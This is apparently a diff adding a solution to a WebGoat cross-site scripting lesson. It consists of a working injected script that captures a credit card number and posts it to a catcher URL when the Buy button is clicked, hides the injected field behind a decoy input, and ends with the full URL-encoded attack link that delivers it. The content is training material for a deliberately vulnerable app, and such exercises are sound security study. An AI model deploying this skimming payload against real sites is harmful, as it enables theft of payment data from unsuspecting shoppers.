@@ -1,0 +1,23 @@
+<script>
+	window.addEventListener('load', function () {
+	  	var num = document.getElementsByName("input1")[0].value;
+		console.log(num);
+		var buy = document.getElementsByName("buy")[0];
+		buy.onclick = function() {
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", ' http://localhost:8080/WebGoat/catcher?PROPERTY=yes&stolenCreditCard='+num, true);
+			xhr.send();
+		};
+		var noSus = document.getElementsByName("input2")[0];
+		noSus.style.display = "none";
+		var fake = document.createElement("INPUT");
+		fake.setAttribute("type", "text");
+		fake.setAttribute("value", "000");
+		noSus.parentNode.appendChild(fake);
+
+	})
+	
+</script>
+
+//Link
+http://localhost:8080/WebGoat/attack?QTY1=0&QTY2=0&QTY3=0&QTY4=0&input1=4128+3214+0002+1999&input2=%3Cscript%3E+%09window.addEventListener%28%27load%27%2C+function+%28%29+%7B+%09++%09var+num+%3D+document.getElementsByName%28%22input1%22%29%5B0%5D.value%3B+%09%09console.log%28num%29%3B+%09%09var+buy+%3D+document.getElementsByName%28%22buy%22%29%5B0%5D%3B+%09%09buy.onclick+%3D+function%28%29+%7B+%09%09%09var+xhr+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09xhr.open%28%22POST%22%2C+%27+http%3A%2F%2Flocalhost%3A8080%2FWebGoat%2Fcatcher%3FPROPERTY%3Dyes%26stolenCreditCard%3D%27%2Bnum%2C+true%29%3B+%09%09%09xhr.send%28%29%3B+%09%09%7D%3B+%09%09var+noSus+%3D+document.getElementsByName%28%22input2%22%29%5B0%5D%3B+%09%09noSus.style.display+%3D+%22none%22%3B+%09%09var+fake+%3D+document.createElement%28%22INPUT%22%29%3B+%09%09fake.setAttribute%28%22type%22%2C+%22text%22%29%3B+%09%09fake.setAttribute%28%22value%22%2C+%22000%22%29%3B+%09%09noSus.parentNode.appendChild%28fake%29%3B++%09%7D%29+%09+%3C%2Fscript%3E&buy=Buy#attack/1731484628/900
